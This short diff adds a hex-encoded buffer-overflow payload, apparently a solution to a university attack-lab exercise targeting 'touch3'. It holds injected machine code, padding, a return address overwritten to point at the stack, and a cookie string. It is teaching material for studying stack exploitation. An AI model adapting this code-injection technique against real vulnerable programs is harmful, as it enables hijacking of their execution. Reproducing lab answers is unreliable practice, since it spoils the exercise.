@@ -1,0 +1,10 @@
+48 c7 c7 a8 dc 61 55    /* store address of string to %rdi */
+68 fa 18 40 00          /* push address of touch3 */
+c3 			/* return to execute touch3 */
+00 00 00                /* 16 bytes */
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 /* 40 bytes */
+78 dc 61 55 00 00 00 00 /* address of $rsp, that is the entry of injection code */
+35 39 62 39 39 37 66 61
+00  			/* store the string above the return address */
